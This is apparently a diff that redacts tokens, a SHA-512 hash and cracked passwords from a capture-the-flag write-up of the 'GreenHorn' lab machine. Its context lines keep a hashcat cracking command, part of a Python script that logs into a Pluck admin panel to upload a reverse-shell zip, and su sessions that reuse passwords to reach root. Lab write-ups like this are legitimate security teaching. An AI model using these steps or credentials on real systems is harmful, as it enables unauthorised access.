@@ -124,7 +124,7 @@ Exploring the repository further, we discover two interesting files:
 
 ```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
-<?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
+<?php $token = '[REDACTED-TOKEN]'; ?>
 ```
 
 **pass.php:**
@@ -132,7 +132,7 @@ http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token
 ```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
 <?php
-$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
+$ww = '[REDACTED-SHA512-HASH]';
 ?>
 ```
 
@@ -141,11 +141,11 @@ $ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c558
 We quickly realize `pass.php` contains a SHA-512 hash. We attempt to decode it with hashcat and rockyou.txt:
 
 ```bash
-echo "d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163" > hash.txt
+echo "[REDACTED-SHA512-HASH]" > hash.txt
 hashcat -m 1700 -a 0 hash.txt /home/kali/rockyou.txt
 ```
 
-Once decoded, we obtain the password `iloveyou1`:
+Once decoded, we obtain the password `[REDACTED]`:
 
 ```bash
 Dictionary cache hit:
@@ -154,7 +154,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
+[REDACTED-SHA512-HASH]:[REDACTED]
 ```
 
 ## Gaining Admin Access to Pluck
@@ -195,7 +195,7 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 login_url = "http://greenhorn.htb/login.php"
 upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
 headers = {"Referer": login_url,}
-login_payload = {"cont1": "iloveyou1","bogus": "","submit": "Log in"}
+login_payload = {"cont1": "[REDACTED]","bogus": "","submit": "Log in"}
 
 file_path = "/home/kali/reverse-shell.zip"
 
@@ -447,12 +447,12 @@ Examining the permissions, it appears junior installed Gitea but misconfigured t
 
 ### Password Reuse
 
-Since junior configured Gitea and uploaded the `pass.php` file we cracked earlier, we try the same password, `iloveyou1`:
+Since junior configured Gitea and uploaded the `pass.php` file we cracked earlier, we try the same password, `[REDACTED]`:
 
 ```bash
 www-data@greenhorn:/$ su junior
 su junior
-Password: iloveyou1
+Password: [REDACTED]
 whoami
 junior
 ls -la
@@ -574,7 +574,7 @@ We try the depixelated password to connect as root and display the flag:
 
 ```bash
 su
-Password: sidefromsidetheothersidesidefromsidetheotherside
+Password: [REDACTED]
 whoami
 root
 cd /root
